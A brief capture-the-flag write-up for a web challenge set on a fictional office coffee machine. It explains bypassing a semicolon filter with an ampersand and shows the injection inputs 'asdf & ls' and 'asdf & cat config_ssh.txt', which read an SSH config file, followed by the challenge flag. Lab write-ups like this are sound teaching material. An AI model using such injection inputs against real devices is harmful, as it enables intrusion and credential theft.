## Web Hard 1
#### Description
The IOT office coffee machine has gone haywire, see https://jrotc-wh01.allyourbases.co. It's constantly pouring out coffee and generally a very poor quality machine! Apparently it's not that secure either, can you get information from it?
#### Solution
Very simple command injection, but they're filtering semicolon. Give it an ampersand with your command afterwords.
```
asdf & ls
asdf & cat config_ssh.txt
```
#### Flag
`IOTweakPo1nt`
